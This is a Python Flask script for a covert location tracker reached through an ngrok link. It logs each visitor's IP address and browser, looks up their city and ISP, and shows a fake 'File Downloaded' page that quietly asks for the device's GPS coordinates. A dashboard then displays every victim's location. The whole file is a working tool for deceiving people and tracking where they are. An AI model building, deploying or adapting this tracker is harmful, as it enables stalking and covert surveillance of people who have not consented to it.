#!/usr/bin/env python3
from flask import Flask, request, jsonify, render_template_string
import requests
import json
import os
from datetime import datetime
import time
import threading

app = Flask(__name__)
LOGS_FILE = 'gps_logs.json'

# Keep ngrok alive - ping every 30s
def keep_alive():
    while True:
        requests.get('https://a63d8f362e4e.ngrok-free.app/ping', timeout=5)
        time.sleep(25)

@app.route('/ping')
def ping():
    return "OK - Alive"

@app.route('/')
def track():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', 'Unknown')
    
    lat = request.args.get('lat') or request.form.get('lat')
    lon = request.args.get('lon') or request.form.get('lon')
    
    log = {
        'time': datetime.now().isoformat(),
        'ip': ip,
        'ua': ua[:100],
        'gps': f"{lat},{lon}" if lat and lon else None
    }
    
    # Geolocate
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}?fields=city,country,lat,lon,isp', timeout=3)
        data = r.json()
        if data['status'] == 'success':
            log.update({
                'city': data['city'],
                'country': data['country'],
                'isp': data['isp']
            })
            print(f"🎯 {ip} | {data['city']}, {data['country']} | GPS: {lat},{lon}")
    except:
        print(f"🎯 {ip} | GPS: {lat},{lon}")
    
    # Save
    with open(LOGS_FILE, 'a') as f:
        f.write(json.dumps(log) + '\n')
    
    # GPS page
    return '''
<!DOCTYPE html>
<html><head><title>Success</title>
<style>body{font-family:sans-serif;text-align:center;background:#000;color:lime;padding:50px}</style>
<meta name="viewport" content="width=device-width">
</head>
<body>
<h1>✅ File Downloaded</h1>
<script>
if(navigator.geolocation){
 navigator.geolocation.getCurrentPosition(p=>{
  new Image().src="/gps?lat="+p.coords.latitude+"&lon="+p.coords.longitude;
  document.body.innerHTML+='<p>GPS: '+p.coords.latitude+', '+p.coords.longitude+'</p>';
 });
}
</script>
</body></html>
'''

@app.route('/gps')
def gps():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    print(f"📍 GPS ONLY: {request.remote_addr} -> {lat},{lon}")
    return "GPS received"

@app.route('/logs')
def logs():
    logs = []
    if os.path.exists(LOGS_FILE):
        with open(LOGS_FILE) as f:
            for line in f:
                try:
                    logs.append(json.loads(line))
                except:
                    pass
    return jsonify(logs)

@app.route('/dashboard')
def dashboard():
    return '''
<!DOCTYPE html>
<html><body style="background:black;color:lime;font-family:monospace">
<h1>GPS TRACKER DASHBOARD</h1>
<div id="logs"></div>
<script>
fetch('/logs').then(r=>r.json()).then(d=> {
 document.getElementById('logs').innerHTML = 
  d.map(l=>`<div>${l.time}<br>IP: ${l.ip}<br>${l.city||'?'} ${l.country||''}<br>GPS: ${l.gps||'No'}<hr>`).join('');
});
setTimeout(()=>location.reload(),5000);
</script>
</body></html>
'''

if __name__ == '__main__':
    print("🔥 GPS TRACKER FIXED - Starting...")
    threading.Thread(target=keep_alive, daemon=True).start()
    app.run(host='0.0.0.0', port=8080)
